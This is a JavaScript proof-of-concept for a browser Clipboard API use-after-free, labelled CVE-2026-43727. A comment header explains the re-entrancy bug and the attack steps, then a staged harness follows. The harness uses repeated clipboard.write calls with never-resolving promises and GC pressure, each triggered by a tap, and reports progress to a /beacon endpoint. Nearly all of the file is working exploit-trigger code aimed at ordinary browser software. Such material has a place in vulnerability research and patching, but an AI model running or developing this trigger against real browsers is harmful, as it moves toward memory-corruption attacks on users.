// p515 — CVE-2026-43727: Clipboard API re-entrancy UAF
//
// ClipboardItemBindingsDataSource::clearItemTypeLoaders() iterates
// m_itemTypeLoaders calling invokeCompletionHandler() on each, then clears.
// Re-entrant clipboard.write() during a completion handler invalidates
// the iterator (the vector is cleared and rebuilt), causing UAF.
//
// Fix (not in WK-1400): std::exchange(m_itemTypeLoaders, {}) before loop.
//
// Attack:
// 1. Create ClipboardItem with never-resolving promise (keeps loader alive)
// 2. clipboard.write([item]) — first write, sets up loaders
// 3. clipboard.write([item]) — second write, calls clearItemTypeLoaders
//    which iterates the OLD loaders, invokeCompletionHandler runs JS,
//    re-entrant clipboard.write clears/rebuilds while outer loop runs
//
// Requires: SecureContext (HTTPS), user gesture for shouldProceedWithClipboardWrite
//
// Beacon prefix: V515-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V515-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // T1: Feature detection
  var features = {
    clipboard: !!navigator.clipboard,
    write: !!(navigator.clipboard && navigator.clipboard.write),
    read: !!(navigator.clipboard && navigator.clipboard.read),
    writeText: !!(navigator.clipboard && navigator.clipboard.writeText),
    ClipboardItem: typeof ClipboardItem !== 'undefined',
    isSecure: location.protocol === 'https:'
  };
  B('T1-FEATURES', JSON.stringify(features));

  if (!features.clipboard || !features.write || !features.ClipboardItem) {
    B('T1-DEAD', 'Clipboard API not available');
    return;
  }

  // T2: Test basic clipboard.write (in click handler for user gesture)
  var statusDiv = document.createElement('div');
  statusDiv.id = 'v515-status';
  statusDiv.textContent = 'V515: Tap here to test clipboard';
  statusDiv.style.cssText = 'position:fixed;top:10px;left:10px;padding:20px;background:#333;color:#0f0;font-size:18px;z-index:99999;cursor:pointer;border:2px solid #0f0';
  document.body.appendChild(statusDiv);

  var testPhase = 0;

  statusDiv.addEventListener('click', function() {
    testPhase++;
    if (testPhase === 1) {
      runT2();
    } else if (testPhase === 2) {
      runT3();
    } else if (testPhase === 3) {
      runT4();
    }
  });

  // T2: Basic write test
  function runT2() {
    statusDiv.textContent = 'V515: Testing basic clipboard.write...';
    B('T2-START', 'basic clipboard write test');
    try {
      var blob = new Blob(['test'], {type: 'text/plain'});
      var item = new ClipboardItem({'text/plain': blob});
      navigator.clipboard.write([item]).then(function() {
        B('T2-OK', 'clipboard.write succeeded');
        statusDiv.textContent = 'V515: Write OK! Tap for re-entrancy test';
      }).catch(function(e) {
        B('T2-FAIL', e.name + ': ' + e.message);
        statusDiv.textContent = 'V515: Write FAILED: ' + e.message + '. Tap for T3';
      });
    } catch(e) {
      B('T2-ERR', e.name + ': ' + e.message);
      statusDiv.textContent = 'V515: Write ERR: ' + e.message;
    }
  }

  // T3: Re-entrancy UAF — double write with same ClipboardItem
  function runT3() {
    statusDiv.textContent = 'V515: Running re-entrancy test...';
    B('T3-START', 'double write re-entrancy');
    try {
      // Create item with a promise that never resolves
      var neverResolve = new Promise(function() {});
      var item = new ClipboardItem({'text/plain': neverResolve});

      // First write — sets up loaders
      navigator.clipboard.write([item]).then(function() {
        B('T3-WRITE1-OK', 'unexpected success');
      }).catch(function(e) {
        B('T3-WRITE1-CATCH', e.name + ': ' + e.message);
      });

      // Second write immediately — triggers clearItemTypeLoaders on same item
      // This should cause re-entrancy in the loader iteration
      navigator.clipboard.write([item]).then(function() {
        B('T3-WRITE2-OK', 'second write succeeded');
      }).catch(function(e) {
        B('T3-WRITE2-CATCH', e.name + ': ' + e.message);
      });

      B('T3-SENT', 'both writes dispatched');
      statusDiv.textContent = 'V515: Re-entrancy test sent! Tap for T4';
    } catch(e) {
      B('T3-ERR', e.name + ': ' + e.message);
      statusDiv.textContent = 'V515: T3 ERR: ' + e.message;
    }
  }

  // T4: Re-entrancy with async/await and microtask drain
  function runT4() {
    statusDiv.textContent = 'V515: Running async re-entrancy test...';
    B('T4-START', 'async re-entrancy');
    (async function() {
      try {
        var neverResolve = new Promise(function() {});
        var item = new ClipboardItem({'text/plain': neverResolve});

        // First write
        var p1 = navigator.clipboard.write([item]);
        B('T4-WRITE1', 'first write dispatched');

        // Microtask drain
        await Promise.resolve();
        B('T4-DRAIN', 'microtask drained');

        // Second write — should trigger clearItemTypeLoaders re-entrancy
        var p2 = navigator.clipboard.write([item]);
        B('T4-WRITE2', 'second write dispatched');

        // Create GC pressure between writes
        var garbage = [];
        for (var i = 0; i < 5000; i++) {
          garbage.push(new ArrayBuffer(256));
        }
        garbage = null;

        // Wait for results
        Promise.allSettled([p1, p2]).then(function(results) {
          B('T4-RESULTS', JSON.stringify(results.map(function(r) {
            return {status: r.status, reason: r.reason ? r.reason.name : undefined};
          })));
        });

        B('T4-SENT', 'async test dispatched');
        statusDiv.textContent = 'V515: All tests complete. Check beacons.';
      } catch(e) {
        B('T4-ERR', e.name + ': ' + e.message);
      }
    })();
  }

  // Auto-report after 5 seconds
  setTimeout(function() {
    B('DONE', 'phase=' + testPhase);
  }, 5000);

})();
